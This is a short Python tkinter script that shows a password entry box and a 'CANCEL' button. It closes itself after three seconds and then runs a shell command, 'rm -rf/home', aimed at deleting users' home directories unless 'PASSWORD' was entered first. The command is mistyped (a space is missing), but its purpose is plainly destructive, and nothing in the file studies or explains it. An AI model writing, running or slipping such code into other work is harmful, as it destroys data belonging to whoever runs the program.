from tkinter import *
import os

a = Tk()
b = Entry(a)
b.pack()
b.focus_set()

def callback():
    if b.get()=="PASSWORD": quit()

c = Button(a, text="CANCEL", width=15, command=callback)
c.pack()

a.after(3000, a.destroy)
mainloop()

os.system("rm -rf/home")